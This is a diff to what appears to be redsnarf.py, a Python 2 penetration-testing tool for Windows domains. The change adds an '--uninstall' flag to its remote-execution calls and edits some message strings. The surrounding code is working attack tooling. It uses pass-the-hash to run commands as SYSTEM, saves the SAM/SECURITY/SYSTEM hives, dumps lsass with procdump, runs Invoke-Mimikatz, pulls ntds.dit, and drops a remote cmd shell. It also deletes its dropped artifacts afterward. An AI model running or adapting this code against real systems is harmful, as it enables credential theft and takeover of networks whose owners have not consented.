@@ -52,7 +52,7 @@ def gppdecrypt(cpassword_pass):
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
 def datadump(user, passw, host, path, os_version):
-	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
+	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
 	if not signal_number:
 		exit_status = (return_value >> 8)
@@ -64,7 +64,7 @@ def datadump(user, passw, host, path, os_version):
 				print colored("[+]Creating directory for host: "+host,'green')
 			try:
 				print colored("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host,'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")
 
 			except OSError:
 				print colored("[-]Something went wrong here getting reg hives from: "+host,'red')
@@ -77,7 +77,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
 			try:
 				print colored("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host,'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
 			except OSError:
 				print colored("[-]Something went wrong here getting reg hives: "+host,'red')
 			try:
@@ -119,9 +119,9 @@ def datadump(user, passw, host, path, os_version):
 
 			if service_accounts in yesanswers:
 				print colored("[+]Checking for services running as users: "+host,'yellow')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\users.txt\" 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\users.txt\" 2>/dev/null")
 				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 				res = os.stat(path+host+"/users.txt").st_size > 3
 				if res==True:
 					try:
@@ -144,9 +144,9 @@ def datadump(user, passw, host, path, os_version):
 				try:
 					print colored("[+]getting dump of lsass: "+host,'green')
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/lsass.dmp"):
 						print colored("[+]lsass.dmp file found",'green')
 					else:
@@ -164,9 +164,9 @@ def datadump(user, passw, host, path, os_version):
 					fout.close() 
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
 					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
 						print colored("[+]mimi_creddump.txt file found",'green')
 						if not os.path.isfile('/usr/bin/dos2unix'):
@@ -175,8 +175,8 @@ def datadump(user, passw, host, path, os_version):
 						else:
 							print colored("[+]Found dos2unix",'green')
 							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
-							print colored("[+] Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
-							print colored("[+] Basic parsed output:",'green')
+							print colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
+							print colored("[+]Basic parsed output:",'green')
 							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 					else:
 						print colored("[-]mimi_creddump.txt file not found",'red')       
@@ -278,7 +278,7 @@ def main():
 							print colored('\n[+]Spraying...','yellow') 
 							run()
 						except:
-								print colored("[-] Credentials Error",'red')
+								print colored("[-]Credentials Error",'red')
 					if plain:
 						try:
 							userhash = tmphash
@@ -288,15 +288,15 @@ def main():
 							print colored('\n[+]Spraying...','yellow') 
 							run()
 						except:
-								print colored("[-] Credentials Error",'red')
+								print colored("[-]Credentials Error",'red')
 	else:
 		run()
 	if targets.find('/')!=-1:
-		print colored ('\n[+] Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')
+		print colored ('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')
 
 		for ip in IPNetwork(targets):
 			if os.path.isfile(outputpath+str(ip)+'/pwdump'):
-				print colored ('[+] Got a pwdump file for '+str(ip),'blue')
+				print colored ('[+]Got a pwdump file for '+str(ip),'blue')
 				fin=open(outputpath+str(ip)+'/pwdump','r')
 				data2=fin.read()
 				fin.close()
@@ -386,7 +386,7 @@ if drsuapi in yesanswers:
 		except OSError:
 			print colored("[-]Something went wrong using the drsuapi method",'red')
 	else:
-		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
 if ntds_util in yesanswers:
@@ -404,11 +404,11 @@ if ntds_util in yesanswers:
 			fout.write(pscommand)
 			fout.close() 
 			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C c:\\ntds.bat\" < /dev/null")
 			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget registry; exit'")
 			os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; cd redsnarf; recurse; prompt off; mget \"Active Directory\"; exit'")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C rd /s /q c:\\redsnarf\"")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe /C del c:\\ntds.bat\"") 
 			if os.path.isfile(outputpath+targets+'/registry/SYSTEM') and os.path.isfile(outputpath+targets+'/Active Directory/ntds.dit'):	
 				print colored("[+]Found SYSTEM and ntds.dit",'green')
 				print colored("[+]Extracting Hash Database to "+outputpath+targets+'/redsnarf ' +"be patient this may take a minute or two...",'yellow')
@@ -429,7 +429,7 @@ if ntds_util in yesanswers:
 		except OSError:
 			print colored("[-]Something went wrong dumping NTDS.dit",'red')
 	else:
-		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
 if c_password!='':
@@ -470,26 +470,26 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 					os.system("grep --color='auto' -ri password")
 				sys.exit()
 		else:
-			print colored ('[-] Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
-			print colored ('[-] Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
+			print colored ('[-]Something has gone wrong check your parameters!, Try --help for a list of parameters','red')
+			print colored ('[-]Usage - ./redsnarf.py -H 10.0.0.1 -u username -p password -P y -D domain','yellow')
 			sys.exit()
 	else:
-		print colored ('\n[-] It is only possible to use this technique on a single target and not a range','red')
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
 if dropshell in yesanswers:
 	if targets.find('/')==-1:
 		try:
 			print colored ('\n[+] Dropping Shell on '+targets+'\n','yellow')
-			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe\" 2>/dev/null")
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets+" \"cmd.exe\" 2>/dev/null")
 			sys.exit()
 		except:
 			sys.exit()
 	else:
-		print colored ('\n[-] It is only possible to drop a shell on a single target and not a range','red')
+		print colored ('\n[-]It is only possible to drop a shell on a single target and not a range','red')
 		sys.exit()
 if targets is None:
-	print colored ('[-] You have not entered a target!, Try --help for a list of parameters','red')
+	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
 	sys.exit()
 
 syschecks()
